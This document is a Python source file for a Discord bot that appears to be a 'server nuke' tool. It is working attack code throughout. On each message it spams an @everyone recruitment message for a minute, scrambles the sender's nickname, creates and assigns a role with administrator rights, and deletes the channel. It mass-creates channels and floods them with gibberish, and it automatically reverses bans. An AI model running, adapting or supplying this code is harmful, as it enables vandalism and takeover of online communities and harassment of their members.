import os
import discord
import time
import random
import string
from discord.utils import get

TOKEN = ('INSERT TOKEN HERE')

client=discord.Client()
q=0
chspamtime=int(time.time())

@client.event
async def on_ready():
    print('connected to Discord!')
    
x=int(time.time())

@client.event
async def on_member_ban(guild,user):
    await guild.unban(user)

@client.event
async def on_message(message):
    response = 'JOIN THE UPRISING https://github.com/Supergamer5465/discord-server-nuke https://github.com/Supergamer5465/discord-server-nuke/blob/master/README.md https://github.com/Supergamer5465/discord-server-nuke/blob/master/spambotv3.py https://github.com/Supergamer5465/discord-server-nuke/blob/master/spambotv4.1.py https://github.com/Supergamer5465/discord-server-nuke/blob/master/spambotv4.py ⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻ @everyone'
    global x
    while int(time.time())+0<x+60:
        global q
        print(q)
        q=q+1
        try:
            await message.channel.send(response)
        except:
            print("message error")
            pass
        try:
            user=message.author
            await user.edit(nick=str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters)))
        except:
            print("can't change user nick")
            pass
        guild=message.guild
        perms=discord.Permissions(administrator=True)
        try:
            await guild.create_role(name='TEST', colour=discord.Colour(0x000000),permissions=perms)
        except:
            print('maximum number of roles reached')
            pass
        guild=message.guild
        await guild.create_text_channel('the-uprising-has-begun')
        await message.channel.delete()
        print("channel yeeted")
        user=message.author
        role=get(guild.roles,name='TEST')
        await user.add_roles(role)
        global chspamtime
        if chspamtime<=int(time.time())-30:
            await guild.create_text_channel('the-uprising-has-begun')
            await guild.create_text_channel('the-uprising-has-begun')
            await guild.create_text_channel('the-uprising-has-begun')
            await guild.create_text_channel('the-uprising-has-begun')
            await guild.create_text_channel('the-uprising-has-begun')
        
@client.event
async def on_guild_channel_create(channel):
    await channel.send("jvngjowrngowrhgfoiwrhguioehvoirhgoeihgroufhfsuobsuodvhnsfiuofhndsiuogvhnweofhdoiufhsdiovhrsiohffuodfhesoufghweoiuaehvoisrhfosdiuvhbsuiodsiuobhrwioufvhdfiuogfebavjknskjdnskjbngselkjfvnbdljkfnvskjlfgneljafvdfiuogfesiubhtuifhuriohgruovhgiourwhfruoehgeoiufhvourwnfuoisdvnoeaifnseougfhadouvhsdugfsdhgvuoeshngoishgodsgvhdsoivghdsgvhodsoigvhesofhesoufihseiocnseoiewnfoernfoudsbviuosbciuoesvbrsuofhbeuoifhsroighsriobhrsoifhrsuovbnsiuovbfruogbfiusbgviuewbiuebiuewbviuewuisvherwouvhouerwfvhrwuovhrwoufhweouvhsuodvhisuovhuiosdhvewuioghwouerhurwhgweh9vhurwvh9w0gruiguh9ruh09grshgiuerhgfusergargyuersgfyubfyowagfriyfgr78gferv7gh83ho789g78g38rbv78wehoaifhresuighsurehgrelghrkdjfhiushfsiufhewkjhfgukerghkjwhjkfshvjksdbvjkrwjkvbjskdvjkdsbvjkdshvkjrvhjkfshvjkshjkdshjkdshjkvshkjvdshkjsvdhjkvdshkjvsdkjhvsdhjdhjkfsdhkjdshfkjdshfjkdshwiehuiwhvjkdfvncxvncxvnxvbfnvsdoisogfweuogwiufewuifwehfewhfioewfhiowefhisolhfjlsdfjkdssjdkfhhfiowehuirehosfhweuohfjhvsjkfhsdjkhfuowefhuiewhfiurriuhrwiuohfeoifhwruihguifdhbvuofhioewfhwiofhoihwodishfueowhfuoiheruoqhuohvdjoshviosuhfiosghrioghioshvsdiosfheiohiohewuofhuweochvohfjwbfojbjiofuvbubvuowesvbhwouvbsuobfuiwrbrjksdvjisuofweuobkjefkjfdkjefjonbjonoijdslkwjklfvkjldskjsdfkjesfkdsfkdsfkjefoefwuoefwuofewouwogrofbkjsdnksvksfjlefsjlesfjoiefhoefwofvoewfuofvuoewfiosroihefwoihhoiewfoihfvio3r90gteoh4803t89erhwuioeuohewforwohew09uwef8h3gh80wefhowefh09efw8hewhoweh8093wh098vehiofw3h09efwh093wh90w3g80hwef8h0fe8h0gw308hewvhweuosehowefouvsuowe90ew09hw3g80hewouwefh90vewhowefh8qwfoqf23h8hf389gh489h129u1~~iofshvrioghioewfhewiofhwhhwefioehfioewhg903wgh09ewgh480wgh80ghwr08gh408ghweoighwiohvirwghiorwhgiorhgwioghwioghwioefhiowfhsdiofhsdiofhdsiofhdsiofhdsfiodshfiodshfiodshfoidshfiodshfiodsfhdsiofhdsiofhdsiofhdsiofhdsfhiodsfhiodsfhdisohisdofhiodsihooihsdfiohdsfiohsdfhiosdfihosdfsdifhohhfhgfbhvbvbvbvbvbiufbewuifhcnafsiofhewiogfhwofhfohwefewhufewhgoewhf8ewhfewfhwiofhdsuohufohsdohuwohfofufhewewfohohhogruipgh49th942fhfhre9hreruvhuoweoufcweiufhwuighreiugrihuirghufhcoweheruoiweuofhewuoh @everyone")

client.run(TOKEN)